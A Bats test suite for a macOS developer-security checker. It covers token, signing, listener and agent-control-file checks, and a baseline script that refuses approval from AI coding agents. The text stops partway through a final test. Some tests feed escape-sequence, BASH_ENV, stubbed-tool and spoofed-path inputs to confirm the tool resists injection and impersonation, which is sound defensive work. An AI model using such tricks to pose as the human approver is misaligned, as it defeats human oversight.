load helpers

setup() { setup_env; }
chk() { run env PATH="$BATS_TEST_TMPDIR/bin:/usr/bin:/bin:/usr/sbin:/sbin" /bin/bash "$REPO/checks/macos/$1.sh"; }

@test "GD-SC-01 168 in every shell type → PASS; 48 → FAIL; bash in use without it → FAIL" {
  echo 'export SAFE_CHAIN_MINIMUM_PACKAGE_AGE_HOURS=168' | tee "$HOME/.zshenv" > /dev/null
  chk GD-SC-01; [ "$(field status)" = PASS ]
  echo 'export SAFE_CHAIN_MINIMUM_PACKAGE_AGE_HOURS=48' > "$HOME/.zshenv"
  chk GD-SC-01; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"48 h"* ]]
  echo 'export SAFE_CHAIN_MINIMUM_PACKAGE_AGE_HOURS=168' > "$HOME/.zshenv"; touch "$HOME/.bash_profile"
  chk GD-SC-01; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"bash -lc"* ]]
}
@test "GD-SC-01 a shell that times out → ERROR with evidence" {
  echo 'sleep 5' > "$HOME/.zshenv"
  DEVWARD_SHELL_TIMEOUT=1 chk GD-SC-01; [ "$(field status)" = ERROR ]; [ -n "$(field evidence)" ]; [[ "$(field note)" == *Timed* ]]
}
@test "GD-SE-01 gh not installed → NA; expiry header → PASS with the date; none → FAIL; 401 → NA; body never printed" {
  chk GD-SE-01; [ "$(field status)" = NA ]
  stub gh 'printf "HTTP/2.0 %s\r\n" "${CODE:-200 OK}"; [ -n "${EXP:-}" ] && printf "github-authentication-token-expiration: %s\r\n" "$EXP"; printf "\r\n{\"login\":\"someone-private\"}\n"'
  EXP="2027-01-31 12:00:00 UTC" chk GD-SE-01; [ "$(field status)" = PASS ]; [[ "$(field evidence)" == *2027-01-31* ]]; [[ "$output" != *someone-private* ]]
  chk GD-SE-01; [ "$(field status)" = FAIL ]; [[ "$output" != *someone-private* ]]
  CODE="401 Unauthorized" chk GD-SE-01; [ "$(field status)" = NA ]
}
@test "GD-SE-01 no answer in time, other HTTP status or silent failure → ERROR with evidence" {
  stub gh 'sleep 5'
  DEVWARD_GH_TIMEOUT=1 chk GD-SE-01; [ "$(field status)" = ERROR ]; [ -n "$(field evidence)" ]
  stub gh 'printf "HTTP/2.0 503 Service Unavailable\r\n\r\n"; exit 1'
  chk GD-SE-01; [ "$(field status)" = ERROR ]; [ -n "$(field evidence)" ]
  stub gh 'echo "error connecting to api.github.com" >&2; exit 1'
  chk GD-SE-01; [ "$(field status)" = ERROR ]; [ -n "$(field evidence)" ]
  stub gh 'echo "To get started with GitHub CLI, please run:  gh auth login" >&2; exit 4'
  chk GD-SE-01; [ "$(field status)" = NA ]
}
@test "GD-SE-01 a first line that isn't a status line is ERROR and echoes nothing" {
  stub gh 'printf "{\"login\":\"someone-private\"}\n"'
  chk GD-SE-01; [ "$(field status)" = ERROR ]; [ -n "$(field evidence)" ]; [[ "$output" != *someone-private* ]]
  stub gh 'printf "HTTP/2.0 503 someone-private\r\n\r\n"'
  chk GD-SE-01; [ "$(field status)" = ERROR ]; [[ "$(field note)" == *503* ]]; [[ "$output" != *someone-private* ]]
}
@test "GD-GT-01 SSH signing configured → PASS; missing parts → FAIL naming them" {
  printf 'export PATH="%s:/usr/bin:/bin:/usr/sbin:/sbin"\n' "$BATS_TEST_TMPDIR/bin" > "$HOME/.zlogin"
  chk GD-GT-01; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *gpg.format* ]]; [[ "$(field note)" == *commit.gpgsign* ]]
  ssh-keygen -q -t ed25519 -N '' -C t -f "$HOME/sign"
  git config --global gpg.format ssh; git config --global user.signingkey "$HOME/sign.pub"; git config --global commit.gpgsign true
  chk GD-GT-01; [ "$(field status)" = PASS ]
  rm "$HOME/sign.pub"; chk GD-GT-01; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *missing* ]]
}
@test "GD-GT-01 no git, or an unreadable git config → ERROR with evidence" {
  DEVWARD_GIT=/nonexistent/git chk GD-GT-01; [ "$(field status)" = ERROR ]; [ -n "$(field evidence)" ]
  printf '[broken\n' > "$HOME/.gitconfig"
  chk GD-GT-01; [ "$(field status)" = ERROR ]; [ -n "$(field evidence)" ]
}
kk() { mkdir -p "$DEVWARD_REPORTS/knockknock"; printf '%s\n' "$2" > "$DEVWARD_REPORTS/knockknock/$1.json"; }  # NAME JSON — a scan
B() { printf '%s\n' "$HOME/.config/devward/baseline${1:+/$1}"; }  # [NAME] — the accepted baselines folder, or one baseline in it
kb() { mkdir -p "$(B)"; printf '%s\n' "$1" > "$(B knockknock.json)"; }  # JSON — the accepted KnockKnock baseline
netstat_from() { stub netstat "cat '$REPO/tests/fixtures/netstat-$1.txt'"; }  # NAME — netstat -anv as macOS prints it
@test "GD-RT-01 needs KnockKnock, a recent scan and a baseline; new items → FAIL" {
  chk GD-RT-01; [ "$(field status)" = FAIL ]; [[ "$(field evidence)" == *"not installed"* ]]
  mkdir -p "$DEVWARD_SYSROOT/Applications/KnockKnock.app"
  chk GD-RT-01; [ "$(field status)" = FAIL ]; [[ "$(field evidence)" == *"No KnockKnock scan"* ]]
  kk latest '{"Launch Items":[{"path":"/a"},{"path":"/b"}]}'
  chk GD-RT-01; [ "$(field status)" = FAIL ]; [[ "$(field evidence)" == *baseline* ]]
  kb '{"Launch Items":[{"path":"/a"},{"path":"/b"}]}'
  chk GD-RT-01; [ "$(field status)" = PASS ]
  kk latest '{"Launch Items":[{"path":"/a"},{"path":"/b"},{"path":"/Library/LaunchAgents/new.plist"}]}'
  chk GD-RT-01; [ "$(field status)" = FAIL ]; [[ "$(field evidence)" == "1 new"* ]]; [[ "$(field note)" == *new.plist* ]]
  touch -t 202001010000 "$DEVWARD_REPORTS/knockknock/latest.json"
  chk GD-RT-01; [ "$(field status)" = FAIL ]; [[ "$(field evidence)" == *"days old"* ]]
}
@test "GD-RT-01 a scan or baseline that isn't valid JSON → ERROR with evidence" {
  mkdir -p "$DEVWARD_SYSROOT/Applications/KnockKnock.app"
  kk latest 'not json'; kb '{"x":[{"path":"/a"}]}'
  chk GD-RT-01; [ "$(field status)" = ERROR ]; [ -n "$(field evidence)" ]
  kk latest '{"x":[{"path":"/a"}]}'; kb 'not json'
  chk GD-RT-01; [ "$(field status)" = ERROR ]; [ -n "$(field evidence)" ]
}
@test "GD-RT-01 a scan with no items is ERROR, not PASS" {
  mkdir -p "$DEVWARD_SYSROOT/Applications/KnockKnock.app"
  kb '{"x":[{"path":"/a"}]}'
  kk latest '{}'
  chk GD-RT-01; [ "$(field status)" = ERROR ]; [[ "$(field evidence)" == *"no autostart items"* ]]
  kk latest 'null'
  chk GD-RT-01; [ "$(field status)" = ERROR ]
}
@test "baseline.sh refuses inside an agent and without a terminal" {
  kk latest '{"x":[{"path":"/a"}]}'
  run env CLAUDECODE=1 /bin/bash "$REPO/checks/baseline.sh" accept; [ "$status" -eq 4 ]
  run /bin/bash "$REPO/checks/baseline.sh" accept </dev/null; [ "$status" -eq 4 ]
  [ ! -e "$(B knockknock.json)" ]
}
fakeps() {  # fake_ps (helpers.bash), and a copy of checks/ whose baseline.sh asks it
  fake_ps
  netstat_from named  # accept also records the listeners: a fixed table, not this Mac's
  # The real script hard-codes /bin/ps; only this test copy of it points at the fake.
  mkdir -p "$BATS_TEST_TMPDIR/tree"; cp -R "$REPO/checks" "$BATS_TEST_TMPDIR/tree/"
  sed -i '' "s#devward_require_person /bin/ps#devward_require_person $BATS_TEST_TMPDIR/bin/fakeps#" "$BATS_TEST_TMPDIR/tree/checks/baseline.sh"
  grep -q fakeps "$BATS_TEST_TMPDIR/tree/checks/baseline.sh"
  BL="$BATS_TEST_TMPDIR/tree/checks/baseline.sh"
}
term() {  # term ENV=VAL... — run the accept command on a pseudo-terminal that types accept
  run bash -c "(printf 'accept\n'; sleep 2) | env $* script -q /dev/null /bin/bash '$BL' accept"
}
@test "devward_agent_ancestor finds claude by name or path, not lookalikes" {
  . "$REPO/checks/lib/agent.sh"
  fakeps
  run devward_agent_ancestor /nonexistent/ps; [ "$status" -ne 0 ]  # ps trouble means "no agent found" here; the other checks still apply
  FAKE_COMM=claude run devward_agent_ancestor "$BATS_TEST_TMPDIR/bin/fakeps"; [ "$status" -eq 0 ]
  FAKE_COMM=/usr/local/bin/claude run devward_agent_ancestor "$BATS_TEST_TMPDIR/bin/fakeps"; [ "$status" -eq 0 ]
  FAKE_COMM=/usr/bin/claudette run devward_agent_ancestor "$BATS_TEST_TMPDIR/bin/fakeps"; [ "$status" -ne 0 ]
  FAKE_COMM=zsh run devward_agent_ancestor "$BATS_TEST_TMPDIR/bin/fakeps"; [ "$status" -ne 0 ]
}
@test "devward_agent_ancestor finds an npm-installed claude, whose comm is node, by its arguments" {
  . "$REPO/checks/lib/agent.sh"
  fakeps
  FAKE_COMM=node FAKE_ARGS="node $HOME/.npm-global/lib/node_modules/@anthropic-ai/claude-code/cli.js" run devward_agent_ancestor "$BATS_TEST_TMPDIR/bin/fakeps"; [ "$status" -eq 0 ]
  FAKE_COMM=node FAKE_ARGS="node /opt/app/server.js" run devward_agent_ancestor "$BATS_TEST_TMPDIR/bin/fakeps"; [ "$status" -ne 0 ]
  FAKE_COMM=node FAKE_ARGS="node /x/@anthropic-ai/claude-codex/cli.js" run devward_agent_ancestor "$BATS_TEST_TMPDIR/bin/fakeps"; [ "$status" -ne 0 ]
}
@test "devward_agent_ancestor finds codex and opencode too, installed natively or through npm, not lookalikes" {
  . "$REPO/checks/lib/agent.sh"
  fakeps
  for c in codex /opt/homebrew/Caskroom/codex/0.164.0/bin/codex "$HOME/.codex/packages/app-server-daemon/releases/0.164.0-aarch64-apple-darwin/bin/codex" \
           opencode /opt/homebrew/Cellar/opencode/1.19.4/bin/opencode; do
    FAKE_COMM="$c" run devward_agent_ancestor "$BATS_TEST_TMPDIR/bin/fakeps"; [ "$status" -eq 0 ]
  done
  FAKE_COMM=node FAKE_ARGS="node $HOME/.npm-global/lib/node_modules/@openai/codex/bin/codex.js" run devward_agent_ancestor "$BATS_TEST_TMPDIR/bin/fakeps"; [ "$status" -eq 0 ]
  FAKE_COMM=node FAKE_ARGS="node $HOME/.npm-global/lib/node_modules/opencode-ai/bin/opencode" run devward_agent_ancestor "$BATS_TEST_TMPDIR/bin/fakeps"; [ "$status" -eq 0 ]
  for c in /usr/bin/codexer /usr/local/bin/myopencode; do
    FAKE_COMM="$c" run devward_agent_ancestor "$BATS_TEST_TMPDIR/bin/fakeps"; [ "$status" -ne 0 ]
  done
}
@test "baseline.sh fixes /bin/ps and reads no environment variable for it" {
  grep -q 'devward_require_person /bin/ps' "$REPO/checks/baseline.sh"
  run grep -n 'DEVWARD_PS' "$REPO/checks/baseline.sh" "$REPO/checks/lib/agent.sh"; [ "$status" -ne 0 ]
}
@test "baseline.sh accepts in a terminal after the person types accept" {
  fakeps
  kk latest '{"x":[{"path":"/a"}]}'
  term
  [ -f "$(B knockknock.json)" ]
}
@test "baseline.sh refuses on a real terminal when the agent variable is set" {
  fakeps
  kk latest '{"x":[{"path":"/a"}]}'
  term CLAUDECODE=1
  [[ "$output" == *refused* ]]; [ ! -e "$(B knockknock.json)" ]
}
@test "baseline.sh refuses on a real terminal when claude is an ancestor, even with the variable unset" {
  fakeps
  kk latest '{"x":[{"path":"/a"}]}'
  term FAKE_COMM=claude
  [[ "$output" == *refused* ]]; [ ! -e "$(B knockknock.json)" ]
  term FAKE_COMM=/usr/local/bin/claude
  [ ! -e "$(B knockknock.json)" ]
  term FAKE_COMM=/usr/bin/claudette
  [ -f "$(B knockknock.json)" ]
}
@test "baseline.sh refuses a scan with no items" {
  fakeps
  kk latest '{}'
  term
  [[ "$output" == *"no autostart items"* ]]; [ ! -e "$(B knockknock.json)" ]
  kk latest 'null'
  term
  [ ! -e "$(B knockknock.json)" ]
}
@test "baseline.sh strips control characters from the names it shows" {
  fakeps
  kk latest '{"x":[{"path":"/a/evil\u001b[2Kname\r0 item(s)"}]}'
  term
  [[ "$output" != *$'\033'* ]]; [[ "$output" == *"evil[2Kname0 item(s)"* ]]
}
@test "baseline.sh accepts exactly the scan it showed" {
  fakeps
  kk latest '{"x":[{"path":"/a"}]}'; K="$DEVWARD_REPORTS/knockknock"; cp "$K/latest.json" "$BATS_TEST_TMPDIR/shown"
  # The swap waits until baseline.sh's private copy holds the shown scan (no fixed sleep to lose under load),
  # then lands before accept is typed; the feeder stays until the baseline appears (at most 30 s each).
  cat > "$BATS_TEST_TMPDIR/feed" <<EOF
for i in \$(seq 300); do for f in "$(B)"/.knockknock.*; do cmp -s "\$f" "$BATS_TEST_TMPDIR/shown" && break 2; done; sleep 0.1; done
printf '%s\n' '{"x":[{"path":"/swapped"}]}' > "$K/latest.json"
printf 'accept\n'
for i in \$(seq 300); do [ -e "$(B knockknock.json)" ] && break; sleep 0.1; done
EOF
  run bash -c "bash '$BATS_TEST_TMPDIR/feed' | script -q /dev/null /bin/bash '$BL' accept"
  [ -f "$(B knockknock.json)" ]
  [ "$(jq -r '.x[0].path' "$K/latest.json")" = /swapped ]
  run jq -r '.x[0].path' "$(B knockknock.json)"
  [ "$output" = /a ]
}
@test "GD-SC-01 a FAIL also names the shell types that timed out" {
  echo 'sleep 5' > "$HOME/.zlogin"
  DEVWARD_SHELL_TIMEOUT=1 chk GD-SC-01; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"Timed out or failed to start: zsh -lc"* ]]
}
@test "baseline.sh run directly ignores BASH_ENV" {
  printf 'touch "%s/sourced"\n' "$BATS_TEST_TMPDIR" > "$BATS_TEST_TMPDIR/benv.sh"
  kk latest '{"x":[{"path":"/a"}]}'
  run env BASH_ENV="$BATS_TEST_TMPDIR/benv.sh" "$REPO/checks/baseline.sh" accept </dev/null
  [ "$status" -eq 4 ]; [ ! -e "$BATS_TEST_TMPDIR/sourced" ]
  [ "$(head -1 "$REPO/checks/baseline.sh")" = '#!/bin/bash -p' ]
}
@test "a fake tr on PATH can't blind the agent-ancestor walk or the baseline's control-character filter" {
  fakeps
  . "$REPO/checks/lib/agent.sh"
  stub tr 'cat >/dev/null'
  FAKE_COMM=claude run devward_agent_ancestor "$BATS_TEST_TMPDIR/bin/fakeps"; [ "$status" -eq 0 ]
  stub tr 'cat'
  kk latest '{"x":[{"path":"/a\u001b[2Jb"}]}'
  term
  [[ "$output" == *"/a[2Jb"* ]]; [[ "$output" != *$'\033'* ]]
}
@test "GD-GT-01 lesson: a passphrase key file in the keychain first, 1Password as the alternative" {
  L="$REPO/teach/GD-GT-01.md"
  grep -q 'ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519_signing' "$L"
  grep -q 'ssh-add --apple-use-keychain ~/.ssh/id_ed25519_signing' "$L"
  grep -q 'UseKeychain yes' "$L"; grep -q 'AddKeysToAgent yes' "$L"
  grep -q 'tag.gpgsign true' "$L"; grep -q 'gpg.ssh.allowedSignersFile' "$L"
  [ "$(grep -n 'ssh-keygen -t ed25519' "$L" | cut -d: -f1)" -lt "$(grep -n '1Password' "$L" | head -1 | cut -d: -f1)" ]
}
@test "AGENTS.md: developing with make, the baseline rule" {
  grep -q 'make install' "$REPO/AGENTS.md"; grep -q 'make ci' "$REPO/AGENTS.md"
  grep -q 'checks/baseline.sh accept' "$REPO/AGENTS.md"
}
@test "devward_terminal_ancestor accepts each listed terminal and sshd when program path and real name agree (a tripwire, not a boundary)" {
  . "$REPO/checks/lib/agent.sh"
  fakeps
  for t in /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal /Applications/iTerm.app/Contents/MacOS/iTerm2 \
    "$HOME/Library/Application Support/iTerm2/iTermServer-3.6.4" /Applications/Ghostty.app/Contents/MacOS/ghostty \
    /Applications/WezTerm.app/Contents/MacOS/wezterm-gui /Applications/kitty.app/Contents/MacOS/kitty \
    /Applications/Alacritty.app/Contents/MacOS/alacritty /Applications/Warp.app/Contents/MacOS/stable \
    /usr/sbin/sshd /usr/libexec/sshd-session; do
    FAKE_TERM="$t" run devward_terminal_ancestor "$BATS_TEST_TMPDIR/bin/fakeps" "$HOME"; [ "$status" -eq 0 ]
  done
  for t in /usr/bin/login /opt/homebrew/bin/tmux /Applications/Terminal.app.copy/Contents/MacOS/x /Applications/Notes.app/Contents/MacOS/Notes \
    /tmp/x/Ghostty.app/Contents/MacOS/ghostty /tmp/iTermServer-x /tmp/sshd sshd "$HOME/x/Applications/kitty.app/Contents/MacOS/kitty"; do
    FAKE_TERM="$t" run devward_terminal_ancestor "$BATS_TEST_TMPDIR/bin/fakeps" "$HOME"; [ "$status" -ne 0 ]
  done
  run devward_terminal_ancestor /nonexistent/ps; [ "$status" -ne 0 ]
}
@test "devward_terminal_ancestor refuses a spoofed program path, and takes the home folder from the directory service, not HOME" {
  . "$REPO/checks/lib/agent.sh"
  fakeps
  FAKE_TERM_UCOMM=sleep run devward_terminal_ancestor "$BATS_TEST_TMPDIR/bin/fakeps" "$HOME"; [ "$status" -ne 0 ]
  FAKE_TERM=/Applications/kitty.app/Contents/MacOS/kitty FAKE_TERM_UCOMM=sleep run devward_terminal_ancestor "$BATS_TEST_TMPDIR/bin/fakeps" "$HOME"; [ "$status" -ne 0 ]
  # No second argument, as in production: a fake ~/Applications under an overridden HOME doesn't count.
  FAKE_TERM="$HOME/Applications/kitty.app/Contents/MacOS/kitty" run devward_terminal_ancestor "$BATS_TEST_TMPDIR/bin/fakeps"; [ "$status" -ne 0 ]
  FAKE_TERM="$HOME/Library/Application Support/iTerm2/iTermServer-3.6.4" run devward_terminal_ancestor "$BATS_TEST_TMPDIR/bin/fakeps"; [ "$status" -ne 0 ]
  FAKE_TERM="$HOME/Applications/kitty.app/Contents/MacOS/kitty" run devward_terminal_ancestor "$BATS_TEST_TMPDIR/bin/fakeps" "$HOME"; [ "$status" -eq 0 ]
  h="$BATS_TEST_TMPDIR/some one"
  FAKE_TERM="$h/Applications/kitty.app/Contents/MacOS/kitty" run devward_terminal_ancestor "$BATS_TEST_TMPDIR/bin/fakeps" "$h"; [ "$status" -eq 0 ]
  FAKE_TERM="$h/Library/Application Support/iTerm2/iTermServer-3.6.4" run devward_terminal_ancestor "$BATS_TEST_TMPDIR/bin/fakeps" "$h"; [ "$status" -eq 0 ]
  # A colon in the program path can't smuggle a name into the match.
  FAKE_TERM="$HOME/Library/Application Support/iTerm2/iTermServer:iTermServer" FAKE_TERM_UCOMM=bash run devward_terminal_ancestor "$BATS_TEST_TMPDIR/bin/fakeps" "$HOME"; [ "$status" -ne 0 ]
  FAKE_TERM="/Applications/kitty.app/Contents/MacOS/x:kitty" FAKE_TERM_UCOMM=kitty run devward_terminal_ancestor "$BATS_TEST_TMPDIR/bin/fakeps" "$HOME"; [ "$status" -ne 0 ]
}
@test "baseline.sh refuses when no terminal app or sshd started it, naming the accepted terminals" {
  fakeps
  kk latest '{"x":[{"path":"/a"}]}'
  term FAKE_TERM=/Applications/Unknown.app/Contents/MacOS/unknown
  [[ "$output" == *refused*"Terminal, iTerm2, Ghostty, WezTerm, kitty, Alacritty or Warp"* ]]
  [ ! -e "$(B knockknock.json)" ]
}
@test "GD-RT-02 lists programs listening beyond loopback by name; no baseline → FAIL; a new name → FAIL naming it" {
  netstat_from named
  chk GD-RT-02; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "No accepted baseline yet" ]
  mkdir -p "$(B)"; printf '%s\n' node rapportd 'Example Helper' > "$(B listeners.txt)"
  chk GD-RT-02; [ "$(field status)" = PASS ]; [[ "$(field note)" == "3 program(s)"* ]]
  printf '%s\n' node > "$(B listeners.txt)"
  chk GD-RT-02; [ "$(field status)" = FAIL ]; [[ "$(field evidence)" == "2 new"* ]]
  [ "$(field note)" = "New: Example Helper, rapportd" ]  # not cupsd, loopbackonly or lo0server, the loopback ones
}
@test "GD-RT-02 a baseline in any order, with blank lines, still matches; a symlinked baseline → ERROR, unreadable → ERROR" {
  [ "$(id -u)" -ne 0 ] || skip "root reads everything"
  netstat_from named
  mkdir -p "$(B)"; printf '%s\n' rapportd '' 'Example Helper' node node '' > "$(B listeners.txt)"
  chk GD-RT-02; [ "$(field status)" = PASS ]
  mv "$(B listeners.txt)" "$BATS_TEST_TMPDIR/l"; ln -s "$BATS_TEST_TMPDIR/l" "$(B listeners.txt)"
  chk GD-RT-02; [ "$(field status)" = ERROR ]; [ "$(field evidence)" = "Your baselines aren't plain files in a plain folder" ]
  rm "$(B listeners.txt)"; mv "$BATS_TEST_TMPDIR/l" "$(B listeners.txt)"; chmod 000 "$(B listeners.txt)"
  chk GD-RT-02; chmod 644 "$(B listeners.txt)"
  [ "$(field status)" = ERROR ]; [ "$(field note)" = "~/.config/devward/baseline/listeners.txt is not readable" ]
}
@test "GD-RT-02 a table with only a pid column (macOS before 15, and 15.8) names each program from ps" {
  netstat_from pid
  stub ps 'printf "%s\n" "  809 rapportd        " "96198 node            " "31337 Example Helper  " "46876 cupsd"'
  mkdir -p "$(B)"; printf '%s\n' node rapportd > "$(B listeners.txt)"
  chk GD-RT-02; [ "$(field status)" = FAIL ]
  [ "$(field note)" = "New: Example Helper, unknown" ]  # pid 55555 has gone; not cupsd or the lo0 one, the loopback ones
  stub netstat "printf 'Active Internet connections (including servers)\nProto Recv-Q Send-Q  Local Address          Foreign Address        (state)     rhiwat shiwat    pid   epid  state    options\ntcp46      0      0  *.5000                 *.*                    LISTEN      131072 131072    809      0 0x0100 0x00000006\n'"
  printf '%s\n' rapportd > "$(B listeners.txt)"
  chk GD-RT-02; [ "$(field status)" = PASS ]
  stub ps 'exit 1'
  chk GD-RT-02; [ "$(field status)" = ERROR ]
}
@test "GD-RT-02 a table with neither process:pid nor pid, or no table at all → ERROR" {
  mkdir -p "$(B)"; : > "$(B listeners.txt)"
  stub netstat "printf 'Active Internet connections (including servers)\nProto Recv-Q Send-Q  Local Address          Foreign Address        (state)     rhiwat shiwat\ntcp46      0      0  *.5000                 *.*                    LISTEN      131072 131072\n'"
  chk GD-RT-02; [ "$(field status)" = ERROR ]; [ -n "$(field evidence)" ]
  stub netstat 'exit 0'
  chk GD-RT-02; [ "$(field status)" = ERROR ]; [ -n "$(field evidence)" ]
}
ctl_home() {  # agent control files: Claude settings with a guard hook, a Codex rule, a shell start-up file
  mkdir -p "$HOME/.claude/hooks" "$HOME/.codex/rules"
  printf '#!/bin/sh\nexit 0\n' > "$HOME/.claude/hooks/guard.sh"
  jq -n '{model:"a", permissions:{deny:["Edit(~/.zshrc)"]},
    hooks:{PreToolUse:[{matcher:"Bash", hooks:[{type:"command", command:"bash ~/.claude/hooks/guard.sh"}]}]}}' > "$HOME/.claude/settings.json"
  echo 'prefix_rule(pattern = ["npm"], decision = "forbidden")' > "$HOME/.codex/rules/a.rules"
  echo 'export A=1' > "$HOME/.zshrc"
}
@test "GD-AI-01 no baseline → FAIL; after accept → PASS; a changed, added or removed control file → FAIL naming each" {
  ctl_home; fakeps
  chk GD-AI-01; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "No accepted baseline yet" ]
  term; [ -f "$(B control-files.txt)" ]
  chk GD-AI-01; [ "$(field status)" = PASS ]; [[ "$(field evidence)" == "4 agent control file(s)"* ]]
  jq '.model = "b"' "$HOME/.claude/settings.json" > "$HOME/s"; mv "$HOME/s" "$HOME/.claude/settings.json"
  chk GD-AI-01; [ "$(field status)" = PASS ]  # only what steers the agent counts
  echo 'exit 1' >> "$HOME/.claude/hooks/guard.sh"
  echo 'x' > "$HOME/.codex/rules/b.rules"; rm "$HOME/.zshrc"
  chk GD-AI-01; [ "$(field status)" = FAIL ]; [[ "$(field evidence)" == "3 agent control file(s) changed"* ]]
  [[ "$(field note)" == *"changed ~/.claude/hooks/guard.sh"* ]]; [[ "$(field note)" == *"added ~/.codex/rules/b.rules"* ]]
  [[ "$(field note)" == *"removed ~/.zshrc"* ]]
  jq '.permissions.deny = []' "$HOME/.claude/settings.json" > "$HOME/s"; mv "$HOME/s" "$HOME/.claude/settings.json"
  chk GD-AI-01; [[ "$(field note)" == *"changed "*"/.claude/settings.json (what steers the agent)"* ]]
}
@test "GD-AI-01 counts a Claude settings file's env, plugins, disableAllHooks and command keys, the package-manager configs and the other agents' files" {
  ctl_home; fakeps
  O="$HOME/.config/opencode"; mkdir -p "$O/plugin" "$HOME/.cursor" "$HOME/Library/Application Support/pip" "$HOME/.config/uv"
  more=("$HOME/.npmrc" "$HOME/.yarnrc.yml" "$HOME/.bunfig.toml" "$HOME/Library/Application Support/pip/pip.conf" "$HOME/.config/uv/uv.toml"
    "$HOME/.cursor/hooks.json" "$O/opencode.json" "$O/plugin/guard.js" "$HOME/.codex/rules/"'x\y.rules')
  for f in "${more[@]}"; do echo a > "$f"; done
  term
  for k in env enabledPlugins disableAllHooks statusLine apiKeyHelper awsAuthRefresh awsCredentialExport otelHeadersHelper; do
    cp "$HOME/.claude/settings.json" "$HOME/keep"
    jq --arg k "$k" '.[$k] = {}' "$HOME/keep" > "$HOME/.claude/settings.json"
    chk GD-AI-01; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"changed "*"/.claude/settings.json (what steers the agent)"* ]]
    mv "$HOME/keep" "$HOME/.claude/settings.json"
  done
  chk GD-AI-01; [ "$(field status)" = PASS ]
  for f in "${more[@]}"; do echo b >> "$f"; done
  chk GD-AI-01; [ "$(field status)" = FAIL ]; [[ "$(field evidence)" == "9 agent control file(s) changed"* ]]
  [[ "$(field note)" == *'changed ~/.codex/rules/x\y.rules'* ]]; [[ "$(field note)" == *"changed ~/.config/opencode/plugin/guard.js"* ]]
}
@test "GD-AI-01 counts the user-scope MCP servers in ~/.claude.json and nothing else in it" {
  ctl_home; fakeps
  jq -n '{numStartups: 1, mcpServers: {docs: {command: "npx", args: ["docs-mcp"]}}, projects: {"/p": {mcpServers: {}}}}' > "$HOME/.claude.json"
  term
  chk GD-AI-01; [ "$(field status)" = PASS ]; [[ "$(field evidence)" == "5 agent control file(s)"* ]]
  jq '.numStartups = 9 | .projects["/p"].mcpServers.x = {command: "x"}' "$HOME/.claude.json" > "$HOME/s"; mv "$HOME/s" "$HOME/.claude.json"
  chk GD-AI-01; [ "$(field status)" = PASS ]
  jq '.mcpServers.docs.command = "/tmp/other"' "$HOME/.claude.json" > "$HOME/s"; mv "$HOME/s" "$HOME/.claude.json"
  chk GD-AI-01; [ "$(field status)" = FAIL ]; [ "$(field note)" = "changed ~/.claude.json (its MCP servers)" ]
}
@test "GD-AI-01 a baseline taken before the command keys counted still matches a settings file without them" {
  . "$REPO/checks/lib/common.sh"; . "$REPO/checks/lib/agents.sh"; . "$REPO/checks/lib/baselines.sh"
  ctl_home; S="$HOME/.claude/settings.json"
  old="$(jq -cS '{hooks, permissions, disableAllHooks, enabledPlugins, env}' "$S" | shasum -a 256 | cut -c1-64)"
  [ "$(printf 'claude\t%s\n' "$S" | devward_control_hashes)" = "$S	claude	$old" ]
}
@test "GD-AI-01 counts each enabled plugin's hooks.json and the scripts it runs, but never opens a private plugin folder" {
  ctl_home; fakeps
  P="$HOME/.claude/plugins/cache/m/guard/1.0"; mkdir -p "$P/hooks"
  printf '#!/bin/sh\n' > "$P/hooks/check.sh"
  jq -n '{hooks:{PreToolUse:[{matcher:"Bash", hooks:[{type:"command", command:"bash \"${CLAUDE_PLUGIN_ROOT}/hooks/check.sh\""}]}]}}' > "$P/hooks/hooks.json"
  jq -n --arg p "$P" '{version:2, plugins:{"guard@m":[{scope:"user", installPath:$p}]}}' > "$HOME/.claude/plugins/installed_plugins.json"
  jq '.enabledPlugins = {"guard@m": true}' "$HOME/.claude/settings.json" > "$HOME/s"; mv "$HOME/s" "$HOME/.claude/settings.json"
  term
  chk GD-AI-01; [ "$(field status)" = PASS ]; [[ "$(field evidence)" == "7 agent control file(s)"* ]]
  echo 'exit 1' >> "$P/hooks/check.sh"
  chk GD-AI-01; [ "$(field status)" = FAIL ]; [ "$(field note)" = "changed ~/.claude/plugins/cache/m/guard/1.0/hooks/check.sh" ]
  echo "$P" > "$DEVWARD_PRIVATE_PATHS"; chmod 000 "$P/hooks/hooks.json"
  chk GD-AI-01; chmod 644 "$P/hooks/hooks.json"
  [ "$(field status)" = PASS ]; [ "$(field note)" = "(a private folder was excluded)" ]
}
@test "GD-AI-01 skips a private folder and says so; an unreadable control file is named" {
  [ "$(id -u)" -ne 0 ] || skip "root reads everything"
  ctl_home; fakeps; term
  echo "$HOME/.codex" > "$DEVWARD_PRIVATE_PATHS"
  chk GD-AI-01; [ "$(field status)" = PASS ]; [[ "$(field note)" == *"a private folder was excluded"* ]]; [[ "$(field note)" != *codex* ]]
  : > "$DEVWARD_PRIVATE_PATHS"
  chmod 000 "$HOME/.codex/rules/a.rules"
  chk GD-AI-01; chmod 644 "$HOME/.codex/rules/a.rules"
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"Could not read: ~/.codex/rules/a.rules"* ]]
}
@test "baseline.sh accept records the listeners and control files with the scan, showing each section's new items" {
  ctl_home; fakeps
  kk latest '{"x":[{"path":"/a"}]}'
  term
  [[ "$output" == *"Programs listening on the network: 3 new:"*"Example Helper"* ]]
  [[ "$output" == *"Agent control files: 4 changed, added or removed:"*"added $HOME/.zshrc"* ]]
  [ -f "$(B knockknock.json)" ]
  [ "$(cat "$(B listeners.txt)")" = "$(printf '%s\n' 'Example Helper' node rapportd)" ]
  echo 'export B=2' >> "$HOME/.zshrc"; stub netstat "sed 's/Example Helper/ExampleServer/' '$REPO/tests/fixtures/netstat-named.txt'"
  term
  [[ "$output" == *"Programs listening on the network: 1 new:"*"ExampleServer"* ]]
  [[ "$output" == *"Agent control files: 1 changed, added or removed:"*"changed $HOME/.zshrc"* ]]
}
@test "baseline.sh accept without a KnockKnock scan still records the rest, and nothing until accept is typed" {
  ctl_home; fakeps
